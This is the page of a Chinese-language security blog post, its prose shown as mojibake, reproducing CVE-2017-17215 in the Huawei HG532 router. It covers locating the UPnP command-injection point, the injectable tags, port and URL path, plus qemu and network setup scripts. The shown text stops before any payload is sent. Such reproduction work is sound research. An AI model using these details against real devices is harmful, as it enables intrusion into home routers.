<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€æœ¬æ–‡å¯¹ CVE-2017-17215 çš„å¤ç°è¿‡ç¨‹è¿›è¡Œäº†è®°å½•ï¼Œè¯¥æ¼æ´ä½äºåä¸º HG532 è·¯ç”±å™¨ï¼Œåœ¨ UPnP æœåŠ¡ä¸­å­˜åœ¨ NewStatusURL å’Œ NewDownloadURL æ ‡ç­¾ä¸­çš„å‘½ä»¤æ³¨å…¥ã€‚é€šè¿‡å‘ç«¯å£ 37215 ï¼Œåœ°å€ä¸º &#x2F;ctrlt&#x2F;DeviceUpgrade_1 å‘é€ POST æŠ¥æ–‡è¿›è¡Œæ¼æ´çš„è§¦å‘ã€‚æ•´ä½“è€Œè¨€ï¼Œè¿™ä¸ªæ¼æ´ç¡®å®æ˜¯ç›®å‰å¤ç°è¿‡æœ€ç®€å•çš„äº†ï¼Œä½†è‡ªå·±åœ¨åšçš„æ—¶å€™ä¾ç„¶è¸©äº†ä¸€äº›å‘â€¦ï¿½">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-17215å¤ç°ï¼ˆåä¸ºHG532å‘½ä»¤æ‰§è¡Œï¼‰">
<meta property="og:url" content="https://zikh26.github.io/posts/719b289c.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="å‰è¨€æœ¬æ–‡å¯¹ CVE-2017-17215 çš„å¤ç°è¿‡ç¨‹è¿›è¡Œäº†è®°å½•ï¼Œè¯¥æ¼æ´ä½äºåä¸º HG532 è·¯ç”±å™¨ï¼Œåœ¨ UPnP æœåŠ¡ä¸­å­˜åœ¨ NewStatusURL å’Œ NewDownloadURL æ ‡ç­¾ä¸­çš„å‘½ä»¤æ³¨å…¥ã€‚é€šè¿‡å‘ç«¯å£ 37215 ï¼Œåœ°å€ä¸º &#x2F;ctrlt&#x2F;DeviceUpgrade_1 å‘é€ POST æŠ¥æ–‡è¿›è¡Œæ¼æ´çš„è§¦å‘ã€‚æ•´ä½“è€Œè¨€ï¼Œè¿™ä¸ªæ¼æ´ç¡®å®æ˜¯ç›®å‰å¤ç°è¿‡æœ€ç®€å•çš„äº†ï¼Œä½†è‡ªå·±åœ¨åšçš„æ—¶å€™ä¾ç„¶è¸©äº†ä¸€äº›å‘â€¦ï¿½">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252029497.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252030294.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251120088.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252011708.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252019907.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251325450.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252046935.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252054123.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252055156.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252058228.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252057621.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252111532.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252119217.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252125070.png">
<meta property="article:published_time" content="2023-10-25T14:26:00.422Z">
<meta property="article:modified_time" content="2023-10-25T14:35:54.192Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="MIPSæ¶æ„">
<meta property="article:tag" content="å‘½ä»¤æ³¨å…¥">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png">


<link rel="canonical" href="https://zikh26.github.io/posts/719b289c.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/719b289c.html","path":"posts/719b289c.html","title":"CVE-2017-17215å¤ç°ï¼ˆåä¸ºHG532å‘½ä»¤æ‰§è¡Œï¼‰"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>CVE-2017-17215å¤ç°ï¼ˆåä¸ºHG532å‘½ä»¤æ‰§è¡Œï¼‰ | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-å‹é“¾"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E9%93%BE%E6%8E%A5"><span class="nav-number">2.</span> <span class="nav-text">å›ºä»¶é“¾æ¥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="nav-number">3.</span> <span class="nav-text">æ¼æ´å®šä½</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="nav-number">4.</span> <span class="nav-text">æ­å»ºå¤ç°ç¯å¢ƒ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">æ¼æ´å¤ç°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%96%91%E9%97%AE"><span class="nav-number">6.</span> <span class="nav-text">ç–‘é—®</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">7.</span> <span class="nav-text">å‚è€ƒæ–‡ç« </span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">106</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">110</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/719b289c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="CVE-2017-17215å¤ç°ï¼ˆåä¸ºHG532å‘½ä»¤æ‰§è¡Œï¼‰ | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2017-17215å¤ç°ï¼ˆåä¸ºHG532å‘½ä»¤æ‰§è¡Œï¼‰
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-25 22:26:00 / ä¿®æ”¹æ—¶é—´ï¼š22:35:54" itemprop="dateCreated datePublished" datetime="2023-10-25T22:26:00+08:00">2023-10-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOTå®‰å…¨</span></a>
        </span>
          ï¼Œ
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/%E5%A4%8D%E7%8E%B0CVE/" itemprop="url" rel="index"><span itemprop="name">å¤ç°CVE</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ¬æ–‡å¯¹ <code>CVE-2017-17215</code> çš„å¤ç°è¿‡ç¨‹è¿›è¡Œäº†è®°å½•ï¼Œè¯¥æ¼æ´ä½äºåä¸º <code>HG532</code> è·¯ç”±å™¨ï¼Œåœ¨ <code>UPnP</code> æœåŠ¡ä¸­å­˜åœ¨ <code>NewStatusURL</code> å’Œ <code>NewDownloadURL</code> æ ‡ç­¾ä¸­çš„å‘½ä»¤æ³¨å…¥ã€‚é€šè¿‡å‘ç«¯å£ <code>37215</code> ï¼Œåœ°å€ä¸º <code>/ctrlt/DeviceUpgrade_1</code> å‘é€ <code>POST</code> æŠ¥æ–‡è¿›è¡Œæ¼æ´çš„è§¦å‘ã€‚æ•´ä½“è€Œè¨€ï¼Œè¿™ä¸ªæ¼æ´ç¡®å®æ˜¯ç›®å‰å¤ç°è¿‡æœ€ç®€å•çš„äº†ï¼Œä½†è‡ªå·±åœ¨åšçš„æ—¶å€™ä¾ç„¶è¸©äº†ä¸€äº›å‘â€¦ğŸ˜…</p>
<span id="more"></span>

<h3 id="å›ºä»¶é“¾æ¥"><a href="#å›ºä»¶é“¾æ¥" class="headerlink" title="å›ºä»¶é“¾æ¥"></a>å›ºä»¶é“¾æ¥</h3><p>å›ºä»¶é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1bhUyY-b6rxlAj8pG3cFFjQ?pwd=98uv">https://pan.baidu.com/s/1bhUyY-b6rxlAj8pG3cFFjQ?pwd=98uv</a><br>æå–ç ï¼š98uv</p>
<h3 id="æ¼æ´å®šä½"><a href="#æ¼æ´å®šä½" class="headerlink" title="æ¼æ´å®šä½"></a>æ¼æ´å®šä½</h3><p>æ ¹æ®æ¼æ´æŠ«éœ²å¯çŸ¥ï¼Œåœ¨å¯åŠ¨ <code>UPnP</code> æœåŠ¡æ—¶ï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png" alt="image-20231025202359522"></p>
<p>ç”¨ <code>binwalk</code> å°†å›ºä»¶è§£å‹åï¼ŒæŠŠæ–‡ä»¶ç³»ç»Ÿä¸­ <code>/bin</code> ç›®å½•ä¸‹çš„ <code>UPnP</code> ç¨‹åºç»™æ‹·è´å‡ºæ¥ï¼Œä½¿ç”¨ <code>IDA</code> åˆ†æå®šä½æ¼æ´ç‚¹æ—¶ï¼Œæˆ‘çš„æ€è·¯æ˜¯å…ˆå¯¹<code>system</code> å‡½æ•°äº¤å‰å¼•ç”¨çœ‹çœ‹ï¼Œæ—¢ç„¶æ˜¯å‘½ä»¤æ³¨å…¥ï¼Œé‚£å¤§æ¦‚ç‡æ˜¯ <code>snprintf + system</code> é€ æˆçš„ã€‚</p>
<p>åœ¨å¯¹ <code>system</code> äº¤å‰å¼•ç”¨åˆ°æœ€åä¸€ä¸ªæ—¶ï¼Œæœç„¶å‘ç°äº†æ¼æ´ç‚¹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252029497.png" alt="image-20231025202940356"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252030294.png" alt="image-20231025203019229"></p>
<p>è¿™é‡ŒæŠŠ <code>v4</code> <code>v5</code> å’Œæ­£å¸¸å­—ç¬¦ä¸²æ‹¼æ¥åï¼Œç›´æ¥æ‰§è¡Œäº† <code>system</code> å‘½ä»¤ï¼Œç”±äº <code>NewStatusURL</code> å’Œ <code>NewDownloadURL</code> æ ‡ç­¾ä¸­çš„å†…å®¹æ˜¯ç”¨æˆ·å¯æ§ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥æ¼æ´</p>
<h3 id="æ­å»ºå¤ç°ç¯å¢ƒ"><a href="#æ­å»ºå¤ç°ç¯å¢ƒ" class="headerlink" title="æ­å»ºå¤ç°ç¯å¢ƒ"></a>æ­å»ºå¤ç°ç¯å¢ƒ</h3><p>å¯åŠ¨ <code>qemu</code> ä¹‹å‰ï¼Œæˆ‘æ˜¯å…ˆæ‰§è¡Œ <code>net.sh</code> è„šæœ¬ï¼Œåˆ›å»ºäº†ä¸€ä¸ªç½‘æ¡¥å¹¶ä¸”è®¾ç½®äº† <code>tap0</code> æ¥å£ç•™ç»™ <code>qemu</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo brctl addbr br0                     # æ·»åŠ ä¸€åº§åä¸º br0 çš„ç½‘æ¡¥</span><br><span class="line">sudo brctl addif br0 ens33                # åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span><br><span class="line">sudo brctl stp br0 off                   # å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span><br><span class="line">sudo brctl setfd br0 1                   # è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span><br><span class="line">sudo brctl sethello br0 1                # è®¾ç½® br0 çš„ hello æ—¶é—´</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # å¯ç”¨ br0 æ¥å£</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # å¯ç”¨ç½‘å¡æ¥å£</span><br><span class="line">sudo dhclient br0                        # ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span><br><span class="line">sudo brctl show br0                      # æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span><br><span class="line">sudo brctl showstp br0                   # æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span><br><span class="line">sudo tunctl -t tap0 -u root              # åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span><br><span class="line">sudo brctl addif br0 tap0                # åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # å¯ç”¨ tap0 æ¥å£</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<p><code>qemu</code> å¯åŠ¨è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>



<p>æˆ‘è¿è¡Œäº†å¯åŠ¨è„šæœ¬ <code>boot.sh</code> ï¼Œä½†å‘ç°ä¸€ç›´æ²¡æœ‰å›æ˜¾ï¼Œç”¨ <code>ps -ef</code> æŸ¥çœ‹ï¼Œå‘ç°æ˜¯ <code>7069</code> å·è¿›ç¨‹å¡ä½äº†</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251120088.png" alt="image-20231025112029984"></p>
<p>ç»è¿‡åå¤å°è¯•ï¼Œå°†å¯åŠ¨è„šæœ¬é‡Œçš„ <code>vmlinux-2.6.32-5-5kc-malta</code> æ”¹æˆ <code>vmlinux-2.6.32-5-4kc-malta</code> å°±èƒ½æˆåŠŸæŠŠ <code>qemu</code> ç»™å¯èµ·æ¥ï¼ˆåŸå› æˆ‘ä¹Ÿæ²¡ææ˜ç™½ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿™ä¸ªä¸‹è½½å†…æ ¸çš„ç‰ˆæœ¬å½±å“ï¼‰</p>
<p>è¿›å…¥ <code>qemu</code> åï¼Œé¦–å…ˆæ‰§è¡Œ <code>ip add</code> å‘½ä»¤ï¼Œç¡®ä¿èƒ½çœ‹åˆ° <code>IP</code> å¹¶å¯ä»¥æ­£å¸¸å’Œå®¿ä¸»æœºé€šä¿¡</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252011708.png" alt="image-20231025201126562"></p>
<p>å®¿ä¸»æœºæ‰§è¡Œ <code>scp squashfs-root.tar.gz root@10.214.140.139:/root/</code> å‘½ä»¤ï¼Œå°†è§£å‹çš„æ–‡ä»¶ç³»ç»Ÿä¼ å…¥ <code>qemu</code> ä¸­ï¼ˆä¼ è¾“å‰æœ€å¥½æŠŠæ–‡ä»¶å¤¹ç»™å‹ç¼©ä¸€ä¸‹ï¼Œä¼ å…¥åå†è§£å‹ï¼‰</p>
<p>æå‰ç”¨ <code>ssh</code> å†è¿ä¸€ä¸ªåˆ° <code>qemu</code> ä¸Šï¼Œåç»­æ‰§è¡Œç¨‹åº <code>mic</code> æ—¶ä¼šæŠŠå½“å‰ <code>shell</code> ç»™å¡ä½ï¼Œæ‰€ä»¥å…ˆå¼„ä¸ª <code>ssh</code>ï¼ˆå…¶å®å‘½ä»¤åŠ ä¸Š <code>&amp;</code> ç»™å®ƒæ”¾åˆ°åå°è¿è¡Œä¹Ÿæ²¡é—®é¢˜ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252019907.png" alt="image-20231025201917804"></p>
<p>ç§»åŠ¨åˆ°åˆšä¼ å…¥çš„ <code>/root/squashfs-root</code> ç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ¥åšå‡ºéš”ç¦»ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 squashfs-root</span><br><span class="line">cd squashfs-root/</span><br><span class="line">mount --bind /proc proc</span><br><span class="line">mount --bind /dev dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure>



<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æŒ‰ç…§æ¼æ´æŠ«éœ²ä¿¡æ¯æ¥çœ‹ï¼Œéœ€è¦å…ˆæ‰“å¼€ <code>37215</code> ç«¯å£ï¼Œå¹¶å‘è¯¥ç«¯å£ä¸‹çš„ <code> /ctrlt/DeviceUpgrade_1</code> åœ°å€å‘é€æ•°æ®åŒ…ã€‚</p>
<p>é¦–å…ˆæ‰§è¡Œå‘½ä»¤ <code>grep -r &quot;37215&quot; ./</code> ï¼ŒæŸ¥çœ‹å­—ç¬¦ä¸² <code>37215</code> å‡ºç°åœ¨äº†å“ªä¸ªæ–‡ä»¶é‡Œ</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251325450.png" alt="image-20231025132521370"></p>
<p>å‘ç° <code>mic</code> åŒ…å«äº†å­—ç¬¦ä¸² <code>37215</code> ï¼ŒçŒœæµ‹æ˜¯è¯¥ç¨‹åºæ‰“å¼€äº† <code>37215</code> ç«¯å£ï¼Œå› æ­¤å°† <code>mic</code> è¿è¡Œ</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252046935.png" alt="image-20231025204627701" style="zoom:50%;" />



<p>æ‰§è¡Œä¸€ä¼šå‘ç°è¿™ä¸ª <code>ssh</code> è¿ä¸Šæ¥çš„ç»ˆç«¯å¡ä½äº†ï¼ˆåˆšåˆšçš„å‘½ä»¤æˆ‘éƒ½æ˜¯åœ¨ <code>ssh</code> ä¸Šæ¥çš„è¿™ä¸ªç»ˆç«¯æ‰§è¡Œçš„ï¼‰ï¼Œæ­¤æ—¶æŸ¥çœ‹ <code>IP</code> ï¼Œå‘ç°ç½‘å¡ <code>eth0</code> çš„ <code>IP</code>  æ²¡äº†ï¼Œç½‘æ¡¥ <code>br0</code> çš„ <code>IP</code> è¢«æ”¹æˆäº† <code>192.168.1.1</code> ï¼Œä¹Ÿå°±å¯¼è‡´ <code>ssh</code> çš„è¿æ¥æ–­äº†ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252054123.png" alt="image-20231025205409991"></p>
<p>æ‰§è¡Œ <code>ifconfig eth0 192.168.110.112/24 up</code> ï¼Œå°†ç½‘å¡æ”¹å›åŸæœ¬æ­£å¸¸çš„ <code>IP</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252055156.png" alt="image-20231025205522011"></p>
<p>å®¿ä¸»æœºæ‰§è¡Œ <code>ping</code> å‘½ä»¤ï¼Œå‘ç°å·²ç»å¯ä»¥ç»§ç»­å’Œ <code>qemu</code> è¿›è¡Œé€šä¿¡äº†ï¼ˆå¦‚æœæ¢å›åŸæœ¬çš„ <code>IP</code> è¿˜æ— æ³•é€šä¿¡ï¼Œ<strong>ç¡®å®šä¸€ä¸‹è™šæ‹Ÿæœºå¼€çš„æ˜¯ä¸æ˜¯æ¡¥æ¥æ¨¡å¼</strong>ï¼Œæˆ‘æœ€å¼€å§‹ç”¨çš„æ˜¯ <code>NAT</code> ï¼Œ<code>IP</code> æ”¹å›æ­£å¸¸çš„ä¹Ÿä¾ç„¶æ— æ³•é€šä¿¡ï¼ŒæŠ˜è…¾äº†åŠå¤©æ‰å‘ç°è¦å¼€æ¡¥æ¥ğŸ¥²ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252058228.png" alt="image-20231025205816128"></p>
<p>åœ¨ <code>qemu</code> ä¸­æ‰§è¡Œå‘½ä»¤ <code>netstat -aut</code> å‘ç°ç«¯å£ <code>37215</code> å·²ç»æ‰“å¼€</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252057621.png" alt="image-20231025205747452"></p>
